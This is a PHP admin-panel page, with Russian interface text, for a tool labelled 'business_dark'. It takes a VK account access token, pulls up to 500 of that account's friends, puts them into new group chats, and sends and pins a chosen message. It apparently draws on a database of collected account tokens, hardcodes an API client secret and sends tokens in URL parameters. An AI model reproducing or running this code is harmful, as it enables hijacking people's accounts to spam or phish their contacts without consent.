<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {
$msg = '';
	$dr = mysqli_query($db,"select * from data");
	$max = mysqli_num_rows($dr);
if(isset($_GET['massmsg'])) {
	$text = $_GET['textmsg'];
	$msgtitle = $_GET['msgtitle'];
	$token_vk = $_GET['name'];
	$numoffr = 0;
		$tok = $drr['actoken'];
		$getfr = json_decode(file_get_contents('https://api.vk.com/method/friends.get?v=5.73&client_secret=AlVXZFMUqyrnABp8ncuU&user_id=&count=250&access_token='.$token_vk)); 
		$friends_vk = $getfr -> response -> count;
		$farr = '';
		if($friends_vk > 250) {
			
		$frlim = 250;
		} else {
		$frlim = $friends_vk; }
	if($friends_vk > 0) {
		$numofsuc = (+$numofsuc + 1);
		
$i = 0;
		while ($i < $frlim)
		{
			if($farr == '') {
			$farr = $getfr -> response -> items[$i];
			} else {
				$farr = $farr.','.$getfr -> response -> items[$i];
			}
			$i++;
		}
		sleep(1);
		//curl
		$parameters = array(
    'access_token' => $token_vk,
    'v'            => '5.73',
    'title'      => $msgtitle,
    'user_ids'      => $farr,
	'client_secret' => 'AlVXZFMUqyrnABp8ncuU'
);


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.vk.com/method/messages.createChat');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($parameters));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$createChat = json_decode(curl_exec($ch));
curl_close($ch);
//endcurl
$crC = 1;
		$chatid = $createChat -> response;
		$ccid = (2000000000 + $chatid);
		
		//curl SENDING SMS #1
		$parametersSMS = array(
    'access_token' => $token_vk,
    'v'            => '5.73',
	'message' => $text,
    'chat_id'      => $chatid,
    'peer_id'      => $ccid,
	'client_secret' => 'AlVXZFMUqyrnABp8ncuU'
);

$chsendSMS = curl_init();

curl_setopt($chsendSMS, CURLOPT_URL, 'https://api.vk.com/method/messages.send');
curl_setopt($chsendSMS, CURLOPT_POST, true);
curl_setopt($chsendSMS, CURLOPT_POSTFIELDS, http_build_query($parametersSMS));
curl_setopt($chsendSMS, CURLOPT_RETURNTRANSFER, true);
$sendSMS = json_decode(curl_exec($chsendSMS));
curl_close($chsendSMS);
//endcurl
sleep(1);
		if($sendSMS -> response > 0) {
			$sendedsms = 1;
			$smsid = $sendSMS -> response;
			file_get_contents('https://api.vk.com/method/messages.pin?v=5.73&client_secret=AlVXZFMUqyrnABp8ncuU&access_token='.$token_vk.'&peer_id='.$ccid.'&message_id='.$smsid);
		}
		//#2 iteraction
		sleep(1);
		if($friends_vk > 250) {
			$getfrtw = json_decode(file_get_contents('https://api.vk.com/method/friends.get?v=5.73&client_secret=AlVXZFMUqyrnABp8ncuU&user_id=&count=250&offset=250&access_token='.$token_vk)); 
			$farrawy = '';
			$d = 0;
			if($friends_vk > 500) { $frlimit = 250; } else {
				$frlimit = (+$friends_vk - 250);
			}
			while ($d < $frlimit)
		{
			if($farrawy == '') {
			$farrawy = $getfrtw -> response -> items[$d];
			} else {
				$farrawy = $farrawy.','.$getfr -> response -> items[$d];
			}
			$d++;
		}
		sleep(1);
			//curl
		$parameterss = array(
    'access_token' => $token_vk,
    'v'            => '5.73',
    'title'      => $msgtitle,
    'user_ids'      => $farrawy,
	'client_secret' => 'AlVXZFMUqyrnABp8ncuU'
);

$chs = curl_init();

curl_setopt($chs, CURLOPT_URL, 'https://api.vk.com/method/messages.createChat');
curl_setopt($chs, CURLOPT_POST, true);
curl_setopt($chs, CURLOPT_POSTFIELDS, http_build_query($parameterss));
curl_setopt($chs, CURLOPT_RETURNTRANSFER, true);
$createChatw = json_decode(curl_exec($chs));
curl_close($chs);
//endcurl
$crC = 2;
		$chatidw = $createChatw -> response;
		$ccidw = (2000000000 + $chatidw);
		//curl SENDING SMS #1
		$parametersSMSw = array(
    'access_token' => $token_vk,
    'v'            => '5.73',
	'message' => $text,
    'chat_id'      => $chatidw,
    'peer_id'      => $ccidw,
	'client_secret' => 'AlVXZFMUqyrnABp8ncuU'
);

$chsendSMSw = curl_init();

curl_setopt($chsendSMSw, CURLOPT_URL, 'https://api.vk.com/method/messages.send');
curl_setopt($chsendSMSw, CURLOPT_POST, true);
curl_setopt($chsendSMSw, CURLOPT_POSTFIELDS, http_build_query($parametersSMSw));
curl_setopt($chsendSMSw, CURLOPT_RETURNTRANSFER, true);
$sendSMSw = json_decode(curl_exec($chsendSMSw));
curl_close($chsendSMSw);
//endcurl
sleep(1);
		if($sendSMSw -> response > 0) {
			$sendedsms = 2;
			$smsidd = $sendSMSw -> response;
			file_get_contents('https://api.vk.com/method/messages.pin?v=5.73&client_secret=AlVXZFMUqyrnABp8ncuU&access_token='.$token_vk.'&peer_id='.$ccidw.'&message_id='.$smsidd);
		}
		
		}
		
}
		
	
	if($crC > 0) { 
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>
                  <p>Отправлено запросов на создание бесед: <b>'.$crC.'</b>.<br>
				  Отправлено запросов на отправку сообщений: <b>'.$sendedsms.'</b></p>
                </div>';
                echo '<META HTTP-EQUIV="REFRESH" CONTENT="2;URL=../admin/massmsg.php">';
	} else {
		$msg = '<div class="callout callout-danger">
                  <h5>Неудача!</h5>
                  <p>При попытке отправить запрос возникла ошибка.</p>
                </div>';
                echo '<META HTTP-EQUIV="REFRESH" CONTENT="3;URL=../admin/massmsg.php">';
	}


}


} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">'; }
if(!isset($_SESSION['admin'])) { echo '
  <META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">
  <style> body {display:none !important;}'; }
//$randch = rand(100,9999999999999999);
?>
<!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL [<?=$colvousers?>]</span></center>
    </a>

    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
        <div class="row mb-2">
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
      <?=$msg?>
      <div class="col-md-7" style="display:inline-block;">
          <div class="card card-primary">
              <div class="card-header">
<h3 class="card-title">Создаёт беседу с друзьями // business_dark</h3>
              </div>
              <!-- /.card-header -->
              <!-- form start -->
              <form role="form" method="GET">
                <div class="card-body">
				
				<div class="form-group">
                    <label >Токен</label>
                    <input type="text" class="form-control" name="name" required value="" placeholder="Токен" id="link">
                  </div>
                
				
				<div class="form-group">
                    <label >Текст рассылки</label>
                    <input type="text" class="form-control" name="textmsg" required value="" placeholder="Текст" id="link">
                  </div>
				
				   <div class="form-group">
                    <label >Название беседы</label>
                    <input type="text" class="form-control" name="msgtitle" required value="" placeholder="Название беседы" id="link">
                  </div>

                  <input type="hidden" name="massmsg">
				  </div>
          
                <!-- /.card-body -->

                <div class="card-footer">
                  <button type="submit" class="btn btn-primary">Создать беседу</button>
                </div>
              </form>
            </div>


        <!-- /.row -->
      </div><!-- /.container-fluid -->
      
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>